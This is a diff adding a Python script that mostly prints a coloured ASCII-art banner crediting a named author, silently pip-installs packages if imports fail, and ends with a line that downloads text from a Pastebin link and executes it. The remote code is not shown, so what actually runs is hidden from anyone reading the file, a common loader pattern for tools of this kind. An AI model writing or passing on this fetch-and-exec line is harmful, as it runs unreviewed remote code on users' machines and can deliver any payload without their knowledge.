@@ -1,0 +1,46 @@
+import os, sys,re,json,random
+from time import sleep
+import threading
+try:
+	import requests,pystyle
+except:
+	os.system('pip install requests && pip install bs4 && pip install pystyle')
+	from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+def dk():
+   a= "\033[1;92m═\033[1;94m═"*40
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+def dkngan():
+   a= "\033[1;92m═\033[1;94m═"*30
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+def ra(a):
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+     sleep(0.001)
+   print()
+from pystyle import Box
+def logo():
+ os.system('clear')
+ logo="""
+ \033[1;32m╔═══════════════════════════════════════════════════════════════════════════╗
+ \033[0;34m                         Copyright ©Trần Đăng Khoa                           
+ \033[1;32m  _______             \033[0;37m   _____                   \033[1;93m   _  ___                 
+ \033[1;32m |__   __|            \033[0;37m  |  __ \                  \033[1;93m  | |/ / |                
+ \033[1;32m    | |_ __ __ _ _ __ \033[0;37m  | |  | | __ _ _ __   __ _\033[1;93m  | ' /| |__   ___   __ _ 
+ \033[1;32m    | | '__/ _` | '_ \ \033[0;37m | |  | |/ _` | '_ \ / _` |\033[1;93m |  < | '_ \ / _ \ / _` |
+ \033[1;32m    | | | | (_| | | | |\033[0;37m | |__| | (_| | | | | (_| |\033[1;93m | . \| | | | (_) | (_| |
+ \033[1;32m    |_|_|  \__,_|_| |_|\033[0;37m |_____/ \__,_|_| |_|\__, |\033[1;93m |_|\_\_| |_|\___/ \__,_|
+ \033[1;32m                       \033[0;37m                      __/ |\033[1;93m                         
+ \033[1;32m                       \033[0;37m                     |___/ \033[1;93m                         
+ \033[1;32m╚════════════════════════════════════════════════════════════════════════════╝
+ """
+ ra(logo)
+exec(requests.get("https://pastebin.com/raw/3maciaVJ").text)
